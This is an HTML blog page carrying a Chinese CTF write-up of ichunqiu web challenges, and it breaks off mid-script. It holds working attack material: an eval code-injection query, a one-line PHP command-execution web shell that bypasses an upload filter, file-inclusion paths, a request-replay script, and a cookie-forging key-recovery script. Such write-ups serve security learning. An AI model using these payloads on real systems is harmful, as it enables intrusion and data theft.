@@ -1,0 +1,1206 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="title: ichunqiu.mddate: 2019-07-07 09:11:36tags: CTF 爆破-1题目提示：flag就在某六位变量中。 代码如下 123456789&amp;lt;?phpinclude &quot;flag.php&quot;;$a = @$_REQUEST[&apos;hello&apos;];if(!preg_match(&apos;/^\w*$/&apos;,$a ))&amp;#123;  die(&apos;ERROR&apos;);&amp;#125;e">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Moyu&#39;s blog">
+<meta property="og:url" content="http://yoursite.com/2019/07/07/ichunqiu/index.html">
+<meta property="og:site_name" content="Moyu&#39;s blog">
+<meta property="og:description" content="title: ichunqiu.mddate: 2019-07-07 09:11:36tags: CTF 爆破-1题目提示：flag就在某六位变量中。 代码如下 123456789&amp;lt;?phpinclude &quot;flag.php&quot;;$a = @$_REQUEST[&apos;hello&apos;];if(!preg_match(&apos;/^\w*$/&apos;,$a ))&amp;#123;  die(&apos;ERROR&apos;);&amp;#125;e">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/images/1559617216851.png">
+<meta property="og:image" content="http://yoursite.com/images/1559619103440.png">
+<meta property="og:image" content="http://yoursite.com/images/1559743455260.png">
+<meta property="og:image" content="http://yoursite.com/images/1559743746995.png">
+<meta property="og:image" content="http://yoursite.com/images/1559743769496.png">
+<meta property="og:image" content="http://yoursite.com/images/1559636909908.png">
+<meta property="og:image" content="http://yoursite.com/images/1559639716673.png">
+<meta property="og:image" content="http://yoursite.com/images/1559736324794.png">
+<meta property="og:image" content="http://yoursite.com/images/1559740129223.png">
+<meta property="og:image" content="http://yoursite.com/images/1559740252651.png">
+<meta property="og:image" content="http://yoursite.com/images/1559740489843.png">
+<meta property="og:image" content="http://yoursite.com/images/1559740608336.png">
+<meta property="og:image" content="http://yoursite.com/images/1559740688798.png">
+<meta property="og:image" content="http://yoursite.com/images/1559741840336.png">
+<meta property="og:image" content="http://yoursite.com/images/1559741758915.png">
+<meta property="og:image" content="http://yoursite.com/images/1559741967106.png">
+<meta property="og:image" content="http://yoursite.com/images/1560826197206.png">
+<meta property="og:image" content="http://yoursite.com/images/1560827084203.png">
+<meta property="og:image" content="http://yoursite.com/images/1560833750774.png">
+<meta property="og:image" content="http://yoursite.com/images/1560834192048.png">
+<meta property="og:image" content="http://yoursite.com/images/1560048636789.png">
+<meta property="og:image" content="http://yoursite.com/images/1560048872032.png">
+<meta property="og:image" content="http://yoursite.com/images/1560051445075.png">
+<meta property="og:image" content="http://yoursite.com/images/1560051400725.png">
+<meta property="og:image" content="http://yoursite.com/images/1560166612254.png">
+<meta property="og:image" content="http://yoursite.com/images/1560166667454.png">
+<meta property="og:image" content="http://yoursite.com/images/1560166741773.png">
+<meta property="og:image" content="http://yoursite.com/images/1560168023532.png">
+<meta property="og:image" content="http://yoursite.com/images/1560168192979.png">
+<meta property="og:image" content="http://yoursite.com/images/1560169554207.png">
+<meta property="og:image" content="http://yoursite.com/images/1560169618225.png">
+<meta property="og:image" content="http://yoursite.com/images/1560169656962.png">
+<meta property="og:image" content="http://yoursite.com/images/1560925275403.png">
+<meta property="og:image" content="http://yoursite.com/images/1560925401933.png">
+<meta property="og:image" content="http://yoursite.com/images/1560925559214.png">
+<meta property="og:image" content="http://yoursite.com/images/1560926053176.png">
+<meta property="og:image" content="http://yoursite.com/images/1.png">
+<meta property="og:image" content="http://yoursite.com/images/2.png">
+<meta property="og:image" content="http://yoursite.com/images/1557804173167.png">
+<meta property="og:image" content="http://yoursite.com/images/1557988009867.png">
+<meta property="og:image" content="http://yoursite.com/images/1557988486057.png">
+<meta property="og:image" content="http://yoursite.com/images/1557988581982.png">
+<meta property="og:image" content="http://yoursite.com/images/1557988948649.png">
+<meta property="og:image" content="http://yoursite.com/images/1558313699881.png">
+<meta property="og:image" content="http://yoursite.com/images/1558314294910.png">
+<meta property="og:image" content="http://yoursite.com/images/1558316943952.png">
+<meta property="og:image" content="http://yoursite.com/images/1558315951433.png">
+<meta property="og:image" content="http://yoursite.com/images/1558316015415.png">
+<meta property="og:image" content="http://yoursite.com/images/1558316437041.png">
+<meta property="og:image" content="http://yoursite.com/images/1558317088591.png">
+<meta property="og:image" content="http://yoursite.com/images/1558319631304.png">
+<meta property="og:image" content="http://yoursite.com/images/1558320121820.png">
+<meta property="og:image" content="http://yoursite.com/images/1558604764959.png">
+<meta property="og:image" content="http://yoursite.com/images/1558605180682.png">
+<meta property="og:image" content="http://yoursite.com/images/1560934742848.png">
+<meta property="og:image" content="http://yoursite.com/images/1560935544725.png">
+<meta property="og:image" content="http://yoursite.com/images/1560950350997.png">
+<meta property="og:updated_time" content="2019-07-07T01:18:43.426Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Moyu&#39;s blog">
+<meta name="twitter:description" content="title: ichunqiu.mddate: 2019-07-07 09:11:36tags: CTF 爆破-1题目提示：flag就在某六位变量中。 代码如下 123456789&amp;lt;?phpinclude &quot;flag.php&quot;;$a = @$_REQUEST[&apos;hello&apos;];if(!preg_match(&apos;/^\w*$/&apos;,$a ))&amp;#123;  die(&apos;ERROR&apos;);&amp;#125;e">
+<meta name="twitter:image" content="http://yoursite.com/images/1559617216851.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/07/07/ichunqiu/">
+
+
+
+
+
+  <title> | Moyu's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Moyu's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/07/ichunqiu/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Moyu">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/wlp.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Moyu's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline"></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-07T09:11:36+08:00">
+                2019-07-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  5.6k
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>title: ichunqiu.md<br>date: 2019-07-07 09:11:36<br>tags: CTF</p>
+<h2 id="爆破-1"><a href="#爆破-1" class="headerlink" title="爆破-1"></a>爆破-1</h2><p>题目提示：flag就在某六位变量中。</p>
+<p>代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\w*$/'</span>,$a ))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'ERROR'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>php中有一个超全局变量<code>$GLOBALS</code>，包含了全部变量的数组，键为变量名，值为变量值。直接覆盖即可</p>
+<p><img src="/images/1559617216851.png" alt="1559617216851"></p>
+<h2 id="爆破-2"><a href="#爆破-2" class="headerlink" title="爆破-2"></a>爆破-2</h2><p>题目内容：flag不在变量中。</p>
+<p>代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<p>直接读文件即可</p>
+<blockquote>
+<p>?hello=file_get_contents(%27flag.php%27)</p>
+</blockquote>
+<p>然后查看源码就可以得到flag</p>
+<h2 id="爆破-3"><a href="#爆破-3" class="headerlink" title="爆破-3"></a>爆破-3</h2><p>代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">'./flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'nums'</span>]))&#123;</span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>] = <span class="number">0</span>;</span><br><span class="line">  $_SESSION[<span class="string">'time'</span>] = time();</span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = <span class="string">'ea'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'time'</span>]+<span class="number">120</span>&lt;time())&#123;</span><br><span class="line">  session_destroy();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$value = $_REQUEST[<span class="string">'value'</span>];</span><br><span class="line">$str_rand = range(<span class="string">'a'</span>, <span class="string">'z'</span>);</span><br><span class="line">$str_rands = $str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].$str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'whoami'</span>]==($value[<span class="number">0</span>].$value[<span class="number">1</span>]) &amp;&amp; substr(md5($value),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>]++;</span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = $str_rands;</span><br><span class="line">  <span class="keyword">echo</span> $str_rands;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'nums'</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以用数组绕过md5的比较，剩下的就是写脚本访问了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://8d545ea73d3f4a2785de36c85dfebe31af87ac8dbe1b4c8b.changame.ichunqiu.com//?value[]=%s"</span></span><br><span class="line">s = requests.session()</span><br><span class="line">whoami = <span class="string">"ea"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    newurl = url%whoami</span><br><span class="line">    result = s.get(newurl).text</span><br><span class="line">    whoami = result[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag&#123;"</span> <span class="keyword">in</span> result:</span><br><span class="line">        print(result)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1559619103440.png" alt="1559619103440"></p>
+<h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><p>先随便上传一个php，发现过滤了<code>&lt;?</code></p>
+<p><img src="/images/1559743455260.png" alt="1559743455260"></p>
+<p>考虑用另一种方法绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;phP&quot;&gt;echo `$_REQUEST[v]`;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后直接看flag就可以了</p>
+<p><img src="/images/1559743746995.png" alt="1559743746995"></p>
+<p><img src="/images/1559743769496.png" alt="1559743769496"></p>
+<h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><p>首先查看源码，发现是base64图片，url格式有点意思，尝试直接文件包含，得到了源码</p>
+<blockquote>
+<p>index.php?jpg=index.php</p>
+</blockquote>
+<p>源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * Date: 2015/11/16</span></span><br><span class="line"><span class="comment"> * Time: 1:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=hei.jpg'</span>);</span><br><span class="line">$file = $_GET[<span class="string">'jpg'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;file:'</span>.$file.<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"_"</span>, $file);</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>有提示是用<code>phpstorm</code>构建的，尝试访问一下配置文件</p>
+<blockquote>
+<p>/.idea/workspace.xml</p>
+</blockquote>
+<p>找到了我们想要的文件</p>
+<p><img src="/images/1559636909908.png" alt="1559636909908"></p>
+<p>由于上边有过滤，可以用config来代替_，</p>
+<blockquote>
+<p>/index.php?jpg=fl3gconfigichuqiu.php</p>
+</blockquote>
+<p>得到源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * Date: 2015/11/16</span></span><br><span class="line"><span class="comment"> * Time: 1:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span><span class="params">($length, $chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'</span>)</span> </span>&#123;</span><br><span class="line">    $hash = <span class="string">''</span>;</span><br><span class="line">    $max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++)	&#123;</span><br><span class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($txt,$key)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 循环加密</span></span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        $tmp .= chr(ord($txt[$i])+<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $txt = $tmp;</span><br><span class="line">    $rnd=random(<span class="number">4</span>); <span class="comment">//生成四位随机字符</span></span><br><span class="line">    $key=md5($rnd.$key); <span class="comment">//加密所采用的密钥是随机数和key拼接后的md5值</span></span><br><span class="line">    $s=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 使用密钥循环异或</span></span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>;</span><br><span class="line">        $ttmp .= $txt[$i] ^ $key[++$s];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($rnd.$ttmp); </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($txt,$key)</span></span>&#123;</span><br><span class="line">    $txt=base64_decode($txt);</span><br><span class="line">    $rnd = substr($txt,<span class="number">0</span>,<span class="number">4</span>); <span class="comment">//解密用的随机字符和加密时一样</span></span><br><span class="line">    $txt = substr($txt,<span class="number">4</span>); </span><br><span class="line">    $key=md5($rnd.$key); <span class="comment">//解密的密钥也是随机数和key拼接后的md5值</span></span><br><span class="line"></span><br><span class="line">    $s=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>;</span><br><span class="line">        $tmp .= $txt[$i]^$key[++$s];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($tmp);$i++)&#123;</span><br><span class="line">        $tmp1 .= chr(ord($tmp[$i])<span class="number">-10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $tmp1;</span><br><span class="line">&#125;</span><br><span class="line">$username = decrypt($_COOKIE[<span class="string">'user'</span>],$key);</span><br><span class="line"><span class="keyword">if</span> ($username == <span class="string">'system'</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    setcookie(<span class="string">'user'</span>,encrypt(<span class="string">'guest'</span>,$key));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"╮(╯▽╰)╭"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>分析一下加密函数，具体步骤我已经写在了源码里，这里出现的问题是，虽然不知道key，但是加解密采用相同key，而且是按位异或，所以我们很容易就可以得到key的前五位，只需要爆破第六位就可以了</p>
+<p>破解代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findkey</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $txt=<span class="string">'guest'</span>;</span><br><span class="line">    $result=<span class="string">'dmMwZkFOChlL'</span>;</span><br><span class="line">    $tmp = <span class="string">''</span>;</span><br><span class="line">    $key = <span class="string">''</span>;</span><br><span class="line">    $result = base64_decode($result);</span><br><span class="line">    $rnd = substr($result, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">    $result = substr($result, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        $tmp .= chr(ord($txt[$i])+<span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    $txt = $tmp;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        $key .= $txt[$i] ^ $result[$i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"key: "</span> . $key;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"rnd: "</span> . $rnd;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>($key, $rnd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($key, $rnd)</span></span>&#123;</span><br><span class="line">    $chars= <span class="string">'0123456789abcdef'</span>; <span class="comment">//md5的字符集</span></span><br><span class="line">    $file = fopen(<span class="string">"encrypt.txt"</span>, <span class="string">"w"</span>);</span><br><span class="line">    $txt = <span class="string">'system'</span>;</span><br><span class="line">    $tmp = <span class="string">''</span>;</span><br><span class="line">    <span class="comment">// 